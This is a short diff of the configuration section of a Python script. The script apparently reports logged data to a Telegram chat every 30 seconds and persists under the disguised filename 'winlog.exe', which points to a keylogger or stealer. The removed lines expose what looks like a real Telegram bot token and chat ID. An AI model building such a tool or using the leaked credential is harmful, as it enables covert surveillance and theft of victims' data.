@@ -12,8 +12,8 @@ import dotenv
 dotenv.load_dotenv()
 
 # Configuration - must be set in .env file
-bot_token = os.getenv('TELEGRAM_BOT_TOKEN', '8280447475:AAGvDRafgOYIQlhjMSNAFFkY_XbxB53w2Y4')
-chat_id = os.getenv('TELEGRAM_CHAT_ID', '7587079688')
+bot_token = os.getenv('TELEGRAM_BOT_TOKEN', 'Your_bot_token_here')
+chat_id = os.getenv('TELEGRAM_CHAT_ID', 'Your_chat_id_here)')
 interval = int(os.getenv('REPORT_INTERVAL', 30))  # Seconds between reports
 filename = os.getenv('PERSISTENCE_FILENAME', "winlog.exe")
 log = ""
